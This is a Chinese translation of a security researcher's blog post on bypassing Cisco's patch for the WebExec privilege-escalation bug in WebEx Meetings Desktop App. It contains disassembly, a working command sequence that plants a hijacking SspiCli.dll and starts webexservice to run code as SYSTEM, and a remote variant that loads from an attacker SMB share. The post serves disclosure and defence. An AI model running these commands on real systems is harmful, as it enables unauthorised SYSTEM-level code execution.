> 原文链接: https://www.anquanke.com//post/id/167152 


# 如何绕过Cisco WebEx Meetings Desktop App最新补丁


                                阅读量   
                                **159012**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者srcincite，文章来源：srcincite.io
                                <br>原文地址：[https://srcincite.io/blog/2018/12/03/webexec-reloaded-cisco-webex-meetings-desktop-app-lpe.html](https://srcincite.io/blog/2018/12/03/webexec-reloaded-cisco-webex-meetings-desktop-app-lpe.html)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t0152474d8b72a9cef4.png)](https://p2.ssl.qhimg.com/t0152474d8b72a9cef4.png)



## 一、前言

前一段时间，[Ron Bowes](https://twitter.com/iagox86)发现Cisco WebEx Meetings Desktop App中存在一个漏洞，这是一个本地权限提升漏洞，如果攻击者具备用户账户凭据，还能利用`psexec`以`SYSTEM`身份远程执行代码。Ron Bowes将该漏洞命名为**WebExec**，还为此专门建了一个[网站](https://webexec.org/)。现在的问题在于，官方给的补丁貌似并不完美。

在本文中，我重新发现了[CVE-2018-15442](https://srcincite.io/advisories/src-2018-0034)的利用方法，绕过了官方对原始漏洞的补丁。由于原始漏洞和补丁绕过方法相似，因此Cisco决定不为该漏洞发布新的CVE编号，我也比较认同这一决定。从技术角度来讲，这是一个远程代码执行漏洞，但该漏洞的触发方式比较特别，在本地上下文中更好利用。



## 二、简介

[Webex](https://www.webex.com/products/meetings/index.html)网站上对webex的总结如下：

> ……在Webex Meetings的帮助下，加入会议是非常简单的一件事，音频和视频也更加清晰、屏幕共享比以前更加方便。您可以不用去关心背后的技术，专注更为重要的事务……

话虽如此，麻烦Cisco还是不要忘记技术上的安全性。

在阅读Ron的[文章](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec)后，我们知道底层的问题在于WebExService会接收用户可控的一个二进制文件，并将其以`SYSTEM`权限运行。对漏洞利用来说这真是极好的一件事，感谢Cisco！



## 三、再次发现漏洞

根据Ron的描述，打上补丁后应用会检查待执行的文件是否经过WebEx签名。

> 打上补丁后，WebEx仍然可以让远程用户连接并启动进程。然而，如果待运行的可执行文件没有经过WebEx的签名，那么就会停止运行。不幸的是，我们并不知道该主机是否存在漏洞。

好吧，让我们按照正常步骤走，自己检查一下补丁情况。从Cisco的CDN上安装[最新版应用](https://akamaicdn.webex.com/client/WBXclient-33.6.2-16/webexapp.msi)后，可以发现官方已经打上最新补丁：

[![](https://p3.ssl.qhimg.com/t011120d55731cd9da6.png)](https://p3.ssl.qhimg.com/t011120d55731cd9da6.png)

图1. 目前33.6.2.16为最新版本

深入分析`C:\Program Files\Webex\Webex\Applications\WebExService.exe`这个文件后，我们可以看到有趣的一些点。首先我注意到程序代码只查找一种参数类型，即`software-update`:

```
.text:00402DC4 loc_402DC4:                                          ; CODE XREF: sub_402D80+1C
.text:00402DC4                 push    offset aSoftwareUpdate       ; "software-update"
.text:00402DC9                 push    dword ptr [esi+8]            ; lpString1
.text:00402DCC                 call    ds:lstrcmpiW
.text:00402DD2                 test    eax, eax
.text:00402DD4                 jnz     loc_402E66
.text:00402DDA                 push    208h                         ; Size
.text:00402DDF                 push    eax                          ; Val
.text:00402DE0                 lea     eax, [ebp+Dst]
.text:00402DE6                 push    eax                          ; Dst
.text:00402DE7                 call    memset
.text:00402DEC                 add     esp, 0Ch
.text:00402DEF                 lea     eax, [ebp+Dst]
.text:00402DF5                 push    offset pszFile               ; "ptupdate.exe"
.text:00402DFA                 push    dword ptr [esi+10h]          ; pszDir
.text:00402DFD                 push    eax                          ; pszDest
.text:00402DFE                 call    ds:PathCombineW
.text:00402E04                 sub     esp, 18h
.text:00402E07                 lea     eax, [ebp+Dst]
.text:00402E0D                 mov     ecx, esp                     ; Dst
.text:00402E0F                 mov     [esi+10h], eax
.text:00402E12                 push    eax                          ; Src
.text:00402E13                 call    sub_402EB0
.text:00402E18                 call    sub_402310                   ; signature check on ptupdate.exe
.text:00402E1D                 add     esp, 18h
.text:00402E20                 test    eax, eax
.text:00402E22                 jz      short loc_402E46             ; jump if we don't pass the check!
.text:00402E24                 lea     eax, [ebp+var_214]
.text:00402E2A                 mov     [ebp+var_214], 0
.text:00402E34                 push    eax
.text:00402E35                 push    ecx
.text:00402E36                 lea     ecx, [edi-3]
.text:00402E39                 lea     edx, [esi+0Ch]
.text:00402E3C                 call    sub_402960                   ; execute "ptupdate.exe" as winlogon.exe
```

随后，程序代码调用`PathCombineW`，参数为我们在命令行中提供的字符串`ptupdate.exe`。看到这里我已经不想进一步逆向分析了，我甚至懒得去逆向分析签名检查函数或者模拟及执行函数，我心中已经有了攻击计划。



## 四、漏洞利用

此时，我们需要做的就是将`C:\Program Files\Webex\Webex\Applications\*`中的所有文件拷贝到用户（访客用户或者本地用户）可控的一个目录中（该目录也可以是沙盒目录），然后寻找DLL劫持漏洞，或者删除某个DLL实现DLL劫持。

在可以避免的情况下，我不喜欢程序出现非预期行为，因此我想寻找不影响程序状态的DLL植入问题。为了完成这个任务，我首先执行了如下命令：

```
mkdir %cd%\si
copy C:\PROGRA~1\Webex\Webex\Applications\* %cd%\si\*
sc start webexservice a software-update 1 %cd%\si
```

结果表明，`SspiCli.dll`貌似是一个不错的目标。

[![](https://p3.ssl.qhimg.com/t0145904a9ee55c35b6.png)](https://p3.ssl.qhimg.com/t0145904a9ee55c35b6.png)

图2. `ptUpdate.exe`无法在当前目录中找到`SspiCli.dll`

当然，我们还可以继续分析并利用其他43个`LoadLibraryW`调用。此时，在PoC利用场景中，我们需要再加入1条命令：

```
mkdir %cd%\si
copy C:\PROGRA~1\Webex\Webex\Applications\* %cd%\si\*
copy SspiCli.dll %cd%\si
sc start webexservice a software-update 1 %cd%\si
```

[![](https://p5.ssl.qhimg.com/t013e3bf28748e83f33.png)](https://p5.ssl.qhimg.com/t013e3bf28748e83f33.png)

图3. 通过DLL劫持以`SYSTEM`权限执行代码

如上所述，从技术角度来看，我们也可以实现以`SYSTEM`权限运行的RCE效果，但这个过程必须通过身份认证，此时我们可以使用`sc \victim start webexservice a software-update 1 "\attackersharesi"`这条命令。



## 五、总结

如果某个高权限服务执行了文件操作，并且文件路径可由攻击者控制，那么该服务就很容易成功攻击者的目标。这个漏洞非常简单，但功能强大，可以通过SMB方式从远程触发，也能作为沙箱逃逸的一种方法。我认为逻辑漏洞将成为未来主流的漏洞利用目标，此时攻击者距离突破操作系统级别防护仅一步之遥。

Cisco并没有第一时间完全补掉这个漏洞，这一点令人难以置信。Cisco只需要固定`C:\Program Files\Webex\Webex\Applications`目录，并且移除用户控制的所有输入点即可。我总共花了10分钟就找到了这个漏洞，也给这个漏洞起了个名字：`WebExec reloaded`，重新载入攻击者可控的任意DLL文件，非常形象。

最后，非常感谢[iDefense](https://vcp.idefense.com/login.jsf)在漏洞处置过程中发挥的作用。



## 六、参考资料
- [https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181024-webex-injection)
- [https://blog.skullsecurity.org/2018/technical-rundown-of-webexec](https://blog.skullsecurity.org/2018/technical-rundown-of-webexec)